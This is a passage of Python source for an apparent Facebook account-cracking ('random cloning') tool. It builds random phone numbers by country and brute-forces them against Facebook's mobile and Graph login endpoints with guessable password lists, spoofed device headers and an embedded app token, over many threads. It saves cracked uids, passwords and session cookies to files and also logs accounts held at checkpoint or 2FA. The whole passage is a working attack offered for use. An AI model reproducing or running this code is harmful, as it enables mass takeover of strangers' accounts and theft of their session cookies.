            data = {"m_ts": re.search(r'name="m_ts" value="(.*?)"', str(__u_r_l__)).group(1),
            "li": re.search(r'name="li" value="(.*?)"', str(__u_r_l__)).group(1),
            "try_number": 0,"unrecognized_tries": 0,"email": ids,"prefill_contact_point": ids,"prefill_source": "browser_dropdown","prefill_type": "contact_point","first_prefill_source": "browser_dropdown","first_prefill_type": "contact_point","had_cp_prefilled": True,"had_password_prefilled": False,"is_smart_lock": False,"bi_xrwh": 0,"encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),"bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',"jazoest": re.search(r'name="jazoest" value="(\d+)"', str(__u_r_l__)).group(1),"lsd": re.search(r'name="lsd" value="(.*?)"', str(__u_r_l__)).group(1)}
            headers = {"Host": "touch.facebook.com",
            "content-length": str(len((data))),
            "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(re.search(r'Chrome/(\d+)', str(ua)).group(1),re.search(r'Chrome/(\d+)', str(ua)).group(1)),"sec-ch-ua-mobile": "?1","user-agent": ua,"x-response-format": "JSONStream","content-type": "application/x-www-form-urlencoded","x-fb-lsd": re.search(r'name="lsd" value="(.*?)"', str(__u_r_l__)).group(1),"viewport-width": "360","x-requested-with": "XMLHttpRequest","x-asbd-id": "129477","dpr": "2","sec-ch-prefers-color-scheme": "light","sec-ch-ua-platform": '"Android"',"accept": "*/*","origin": "https://touch.facebook.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
            respons = session.post('https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,headers=headers,allow_redirects=False)
            ___f_u_c_k___ = session.cookies.get_dict().keys()
            if "c_user" in ___f_u_c_k___:
                coki=session.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                uid = re.findall('c_user=(.*);xs', kuki)[0]
                year = tutulx(str(uid))
                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                if 'y' in show_cookies:
                    print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+kuki);print('')
                os.system('espeak -a 300 "GEN,  Ok,  id"')
                open('/sdcard/GEN-FILE-M5-OK-COOKIES.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                oks.append(ids)
                break
            elif 'checkpoint' in ___f_u_c_k___:
                uid = re.findall('c_user=(.*);xs', str(session.cookies.get_dict()))[0] if 'c_user' in session.cookies.get_dict() else ids
                if 'y' in pcp:
                    year = tutulx(str(uid))
                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                    os.system('espeak -a 300 "Cp"')
                open('/sdcard/GEN-FILE-M5-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    loop+=1

#------------->> FILE METHOD M6 >>-------------#
def ___M_T_H_D_6___(ids,names,passlist):
    global loop,oks,cps,twf
    if not check_internet():
        wait_for_internet()
    xp=f"{bx}[{gx}MR{bx}]{gx}"
    sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
    
    fn = names.split(' ')[0]
    try:
        ln = names.split(' ')[1]
    except:
        ln = fn
        
    for pw in passlist:
        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
        
        # Use Nigerian user agent
        ua = random.choice(ugen)
        
        datax = {
            'adid': str(uuid.uuid4()), 
            'format': 'json', 
            'device_id': str(uuid.uuid4()), 
            'email': ids, 
            'password': pas, 
            'generate_analytics_claims': '1', 
            'community_id': '', 
            'cpl': 'true', 
            'try_num': '1', 
            'family_device_id': str(uuid.uuid4()), 
            'credentials_type': 'password', 
            'source': 'login', 
            'error_detail_type': 'button_with_disabled', 
            'enroll_misauth': 'false', 
            'generate_session_cookies': '1', 
            'generate_machine_id': '1', 
            'currently_logged_in_userid': '0', 
            'fb_api_req_friendly_name': 'authenticate'
        }
        
        header = {
            'User-Agent': ua, 
            'Accept-Encoding': 'gzip, deflate', 
            'Accept': '*/*', 
            'Connection': 'keep-alive', 
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'X-FB-Friendly-Name': 'authenticate', 
            'X-FB-Connection-Bandwidth': str(random.randint(20000000, 50000000)), 
            'X-FB-Net-HNI': str(random.randint(20000, 40000)), 
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 
            'X-FB-Connection-Type': random.choice(['WIFI', 'CELLULAR', 'MOBILE.4G']), 
            'Content-Type': 'application/x-www-form-urlencoded', 
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True'
        }
        
        try:
            lo = requests.post('https://b-graph.facebook.com/auth/login', data=datax, headers=header, allow_redirects=False, timeout=30).json()
            
            if 'session_key' in lo:
                cki = lo['session_cookies']
                ck = {}
                for xk in cki:
                    ck.update({xk['name']: xk['value']})
                coki = ';'.join(['%s=%s' % (key, value) for key, value in ck.items()])
                uid = lo['uid']
                year = tutulx(str(uid))
                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                if 'y' in show_cookies:
                    print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                os.system('espeak -a 300 "GEN,  Ok,  id"')
                open('/sdcard/GEN-FILE-M6-OK-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in lo['error']['message']:
                uid = lo['error']['error_data']['uid']
                if 'y' in pcp:
                    year = tutulx(str(uid))
                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                    os.system('espeak -a 300 "Cp"')
                open('/sdcard/GEN-FILE-M6-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
                
        except requests.exceptions.ConnectionError:
            continue
        except requests.exceptions.Timeout:
            continue
        except json.JSONDecodeError:
            continue
        except Exception as e:
            continue
            
    loop += 1

#------------->> FILE METHOD M7 >>-------------#
def ___M_T_H_D_7___(ids,names,passlist):
    try:
        global loop,oks,cps,twf
        if not check_internet():
            wait_for_internet()
        xp=f"{bx}[{gx}MR{bx}]{gx}"
        sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            locals = [f"en_US|{random.choice(['T-Mobile', 'Vodafone', 'Verizon', 'U.S. Cellular'])}"]
            local_, network = random.choice(locals).rsplit('|')
            ua = random.choice(ugen)
            data = {
                "adid": str(uuid.uuid4()),
                "format": "json",
                "device_id": str(uuid.uuid4()),
                "cpl": "true",
                "family_device_id": str(uuid.uuid4()),
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": str(uuid.uuid4()),
                "currently_logged_in_userid": "0",
                "locale": 'en_US',
                "client_country_code": 'US',
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"
            }
            headers = {
                "Content-Type": "application/x-www-form-accencoded",
                "Host": "graph.facebook.com",
                "User-Agent": ua,
                "X-FB-Net-HNI": "45204",
                "X-FB-SIM-HNI": "45201",
                "X-FB-Connection-Type": "unknown",
                "X-Tigon-Is-Retry": "False",
                "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
                "x-fb-device-group": "5120",
                "X-FB-Friendly-Name": "ViewerReactionsMutation",
                "X-FB-Request-Analytics-Tags": "graphservice",
                "Accept-Encoding": "gzip, deflate",
                "X-FB-HTTP-Engine": "Liger",
                "X-FB-Client-IP": "True",
                "X-FB-Server-Cluster": "True",
                "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
                "Connection": "Keep-Alive"
            }
            url = 'https://graph.facebook.com/auth/login'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                coki = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=", "").replace("+", "_").replace("/", "-")
                cookies = f"sb={ssbb};{coki}"
                uid = po['uid']
                year = tutulx(str(uid))
                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                if 'y' in show_cookies:
                    print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+cookies);print('')
                os.system('espeak -a 300 "GEN,  Ok,  id"')
                open('/sdcard/GEN-API2-OK-COOKIES.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                oks.append(ids)
                break
            elif "two_factor" in str(po):
                uid = po.get('error', {}).get('error_data', {}).get('uid', ids)
                if 'y' in pcp:
                    year = tutulx(str(uid))
                    print(f'\r\r\x1b[1;90m[\x1b[38;5;214mGEN-2FA\x1b[1;90m]\x1b[38;5;214m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                    os.system('espeak -a 300 "2FA"')
                open('/sdcard/GEN-API2-2FA.txt','a').write(ids+'|'+pas+'\n')
                twf.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                uid = po['error']['error_data']['uid']
                if 'y' in pcp:
                    year = tutulx(str(uid))
                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                    os.system('espeak -a 300 "Cp"')
                open('/sdcard/GEN-API2-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass

#------------->> RANDOM MAIN MENU >>-------------#
country_map = {'1': 'BANGLADESH','2': 'MALAYSIA','3': 'INDIA','4': 'NEPAL','5': 'PAKISTAN','6': 'AFGHANISTAN','7': 'NIGERIA','8': 'USA','9': 'INDONESIA'}
def ____R_A_N_D_O_M____():
    clear();print(f'{xd1} START BANGLADESH RANDOM CLONING ');print(f'{xd2} START MALAYSIA RANDOM CLONING ');print(f'{xd3} START INDIA RANDOM CLONING ');print(f'{xd4} START NEPAL RANDOM CLONING ');print(f'{xd5} START PAKISTAN RANDOM CLONING ');print(f'{xd6} START AFGHANISTAN RANDOM CLONING ');print(f'{xd7} START NIGERIA RANDOM CLONING ');print(f'{xd8} START UNITED STATES RANDOM CLONING ');print(f'{xd9} START INDONESIA RANDOM CLONING ');linex();___O_P_T_I_O_N___ = input(f'{xdx} SELECTION {bx}:{wx} ')
    if ___O_P_T_I_O_N___ in country_map:pookie.append(___O_P_T_I_O_N___);___A_L_L_C_O_U_N_T_Y___(___O_P_T_I_O_N___)
    else:linex();print(f'{xd}{rx} WRONG OPTION SELECTION ');time.sleep(3);____R_A_N_D_O_M____()

def ___A_L_L_C_O_U_N_T_Y___(___O_P_T_I_O_N___):
    clear()
    if '1' in pookie:print(f"{xd} EXAMPLE {bx}:{gx} 016 {bx}|{gx} 017 {bx}|{gx} 018 {bx}|{gx} 019 ");linex()
    elif '2' in pookie:print(f"{xd} EXAMPLE {bx}:{gx} 01128 {bx}|{gx} 011** {bx}|{gx} 012** ");linex()
    elif '3' in pookie:print(f"{xd} EXAMPLE {bx}:{gx} 6383 {bx}|{gx} 8795 {bx}|{gx} 9670 {bx}|{gx} 9163 ");linex()
    elif '4' in pookie:print(f"{xd} EXAMPLE {bx}:{gx} 9840 {bx}|{gx} 9861 {bx}|{gx} 9815 {bx}|{gx} 9814 ");linex()
    elif '5' in pookie:print(f"{xd} EXAMPLE {bx}:{gx} 0318 {bx}|{gx} 0306 {bx}|{gx} 0335 {bx}|{gx} 0345 ");linex()
    elif '6' in pookie:print(f"{xd} EXAMPLE {bx}:{gx} +9350 {bx}|{gx} +9330 {bx}|{gx} +9360 {bx}|{gx} +9340 ");linex()
    elif '7' in pookie:print(f"{xd} EXAMPLE {bx}:{gx} 070 {bx}|{gx} 080 {bx}|{gx} 081 {bx}|{gx} 091 ");linex()
    elif '8' in pookie:print(f"{xd} EXAMPLE {bx}:{gx} 941 {bx}|{gx} 816 {bx}|{gx} 308 {bx}|{gx} 225 ");linex()
    elif '9' in pookie:print(f"{xd} INPUT YOUR INDONESIA COUNTRY SIM CODE");linex()
    code = input(f'{xdx} ENTER SIM CODE {bx}:{wx} ');linex();print(f"{xd} EXAMPLE {bx}:{gx} 3000 {bx}|{gx} 5000 {bx}|{gx} 10000 {bx}|{gx} 99999 ");linex();limit=int(input(f'{xdx} ENTER LIMIT {bx}:{wx} '))
    clear();print(f'{xd1} METHOD {wx}~{gx} M1');print(f'{xd2} METHOD {wx}~{gx} M2');print(f'{xd3} METHOD {wx}~{gx} M3');print(f'{xd4} METHOD {wx}~{gx} M4');print(f'{xd5} METHOD {wx}~{gx} M5');print(f'{xd6} METHOD {wx}~{gx} M6');print(f'{xd7} METHOD {wx}~{gx} M7');linex();___M_T_D___ = input(f'{xd} ENTER METHOD {bx}:{wx} ')
    clear();___S_P___ = input(f'{xd} DO YOU WANT SHOW CP UID {bx}:{wx} {wx}({gx}y{bx}/{rx}n{wx}) ')
    if ___S_P___ in ['y','Y','yes','Yes','1']:pcp.append('y')
    else:pcp.append('n')
    clear();___C_O_O_K_I_E_S___ = input(f'{xd} DO YOU WANT SHOW COOKIES {bx}:{wx} {wx}({gx}y{bx}/{rx}n{wx}) ')
    if ___C_O_O_K_I_E_S___ in ['y','Y','yes','Yes','1']:show_cookies.append('y')
    else:show_cookies.append('n')
    for nmbr in range(int(limit)):
        if "1" in pookie:numberx = ''.join(random.choice(string.digits) for _ in range(8));user.append(numberx)
        elif "2" in pookie:numberxx = ''.join(random.choice(string.digits) for _ in range(6));user.append(numberxx)
        elif "3" in pookie:numberxx = ''.join(random.choice(string.digits) for _ in range(7));user.append(numberxx)
        elif "4" in pookie:numberxx = ''.join(random.choice(string.digits) for _ in range(6));user.append(numberxx)
        elif "5" in pookie:numberxx = ''.join(random.choice(string.digits) for _ in range(7));user.append(numberxx)
        elif "6" in pookie:numberxx = ''.join(random.choice(string.digits) for _ in range(7));user.append(numberxx)
        elif "7" in pookie:numberxx = ''.join(random.choice(string.digits) for _ in range(8));user.append(numberxx)
        elif "8" in pookie:numberxx = ''.join(random.choice(string.digits) for _ in range(8));user.append(numberxx)
        elif "9" in pookie:numberxx = ''.join(random.choice(string.digits) for _ in range(8));user.append(numberxx)
    with tred(max_workers=45) as ___P_R_O___:
        clear();tl = str(len(user))
        country_name = country_map.get(___O_P_T_I_O_N___, "UNKNOWN")
        print(f'{xd} OPERATOR{bx}|{gx}LIMIT{bx}|{gx}METHOD {bx}:{wx} {code}{bx}|{wx}{tl}{bx}|{wx}M{___M_T_D___}\n{xd} CLONING COUNTRY {bx}:{wx} {country_name}');print (f'{xd} FLIGHT MODE {wx}ON{bx}|{wx}OFF{gx} EVERY {wx}3{gx} MINUTES ');linex()
        for love in user:
            ids = code + love
            if "1" in pookie:passlist=[ids,love,ids[:6],ids[:7],ids[:8],ids[5:]]
            elif "2" in pookie:passlist=[ids,love,ids[:7],ids[:6],ids[:8]]
            elif "3" in pookie:passlist=[ids,love,ids[:6],"57273200","57575751","59039200"]
            elif "4" in pookie:passlist=[ids,love,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
            elif "5" in pookie:passlist=[ids,love,ids[5:],'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
            elif "6" in pookie:passlist=[love,ids,'afghan','afghan12345','Afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786','50006000']
            elif "7" in pookie:passlist=[ids,love,ids[:8],ids[:7],ids[:9],ids[:11],ids[:6],ids[:10],"111111","112233","1234567","123123","emmanuel","12345678","abubakar","123456789","adebayo"]
            elif "8" in pookie:passlist=[ids,love,"500500","200200"]
            elif "9" in pookie:passlist=[ids,love,"indonesia","200200","first123","first12"]
            if ___M_T_D___ in ['1']:___P_R_O___.submit(____M_E_T_H_O_D_A____,ids,passlist,tl)
            elif ___M_T_D___ in ['2']:___P_R_O___.submit(____M_E_T_H_O_D_B____,ids,passlist,tl)
            elif ___M_T_D___ in ['3']:___P_R_O___.submit(____M_E_T_H_O_D_C____,ids,passlist,tl)
            elif ___M_T_D___ in ['4']:___P_R_O___.submit(____M_E_T_H_O_D_D____,ids,passlist,tl)
            elif ___M_T_D___ in ['5']:___P_R_O___.submit(____M_E_T_H_O_D_E____,ids,passlist,tl)
            elif ___M_T_D___ in ['6']:___P_R_O___.submit(____M_E_T_H_O_D_F____,ids,passlist,tl)
            elif ___M_T_D___ in ['7']:___P_R_O___.submit(____M_E_T_H_O_D_G____,ids,passlist,tl) 
    print(f"\n{wx}{47*'-'}");print(f'{xd} THE PROCESS HAS COMPLETED');print(f"{xd} TOTAL OK IDS {bx}:{gx} {len(oks)}");print(f"{xd} TOTAL CP IDS {bx}:\x1b[38;5;205m {len(cps)}");print(f"{xd} TOTAL 2FA IDS {bx}:\x1b[38;5;214m {len(twf)}");print(f"{wx}{47*'-'}");exit()

#------------->> RANDOM METHOD M1 B-GRAPH >>-------------#
def ____M_E_T_H_O_D_A____(ids,passlist,tl):
        global loop,oks,cps,twf
        if not check_internet():
            wait_for_internet()
        xp=f"{bx}[{gx}MR{bx}]{gx}"
        sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
        ua = random.choice(ugen)
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pas,"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839","currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d",}
                        headers = {'User-Agent': ua,'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': '45204','X-FB-SIM-HNI': '45201','X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62','Content-Length': '698'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                year = tutulx(str(uid))
                                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                if 'y' in show_cookies:
                                    print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                                os.system('espeak -a 300 "GEN,  Ok,  id"')
                                open('/sdcard/GEN-M1-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                oks.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                uid = po['error']['error_data']['uid']
                                if 'y' in pcp:
                                    year = tutulx(str(uid))
                                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                    os.system('espeak -a 300 "Cp"')
                                open('/sdcard/GEN-M1-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
        except Exception as e:pass

#------------->> RANDOM METHOD M2 GRAPH >>-------------#
def ____M_E_T_H_O_D_B____(ids,passlist,tl):
        global loop,oks,cps,twf
        if not check_internet():
            wait_for_internet()
        xp=f"{bx}[{gx}MR{bx}]{gx}"
        sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
        ua = random.choice(ugen)
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','fb_api_req_friendly_name':'authenticate',}
                        headers = {'Authorization':f'OAuth {accessToken}','X-FB-Friendly-Name':'authenticate','X-FB-Connection-Type':'unknown','User-Agent':ua,'Accept-Encoding':'gzip, deflate','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                year = tutulx(str(uid))
                                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                if 'y' in show_cookies:
                                    print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                                os.system('espeak -a 300 "GEN,  Ok,  id"')
                                open('/sdcard/GEN-M2-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                oks.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                uid = po['error']['error_data']['uid']
                                if 'y' in pcp:
                                    year = tutulx(str(uid))
                                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                    os.system('espeak -a 300 "Cp"')
                                open('/sdcard/GEN-M2-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
        except Exception as e:pass

#------------->> RANDOM METHOD M3 >>-------------#
def ____M_E_T_H_O_D_C____(ids,passlist,tl):
        global loop,oks,cps,twf
        if not check_internet():
            wait_for_internet()
        xp=f"{bx}[{gx}MR{bx}]{gx}"
        sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
        ua = random.choice(ugen)
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        data = {'adid':adid,'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,"logged_out_id": str(uuid.uuid4()),"hash_id": str(uuid.uuid4()),"reg_instance": str(uuid.uuid4()),"session_id": str(uuid.uuid4()),"advertiser_id": str(uuid.uuid4()),'generate_analytics_claims':'1','credentials_type':'password','source':'login',"sim_country": "id","network_country": "id","relative_url": "method/auth.login",'error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','fb_api_req_friendly_name':'authenticate',"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
                        headers = {'Authorization':f'OAuth {accessToken}',"X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE","X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),"X-FB-Net-HNI": str(random.randint(20000, 40000)),"X-FB-SIM-HNI": str(random.randint(20000, 40000)),'X-FB-Friendly-Name':'authenticate','X-FB-Connection-Type':'unknown','User-Agent': ua,'Accept-Encoding':'gzip, deflate','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                year = tutulx(str(uid))
                                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                if 'y' in show_cookies:
                                    print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                                os.system('espeak -a 300 "GEN,  Ok,  id"')
                                open('/sdcard/GEN-M3-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                oks.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                uid = po['error']['error_data']['uid']
                                if 'y' in pcp:
                                    year = tutulx(str(uid))
                                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                    os.system('espeak -a 300 "Cp"')
                                open('/sdcard/GEN-M3-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
        except Exception as e:pass

#------------->> RANDOM METHOD M4 >>-------------#
def ____M_E_T_H_O_D_D____(ids,passlist,tl):
        global loop,oks,cps,twf
        if not check_internet():
            wait_for_internet()
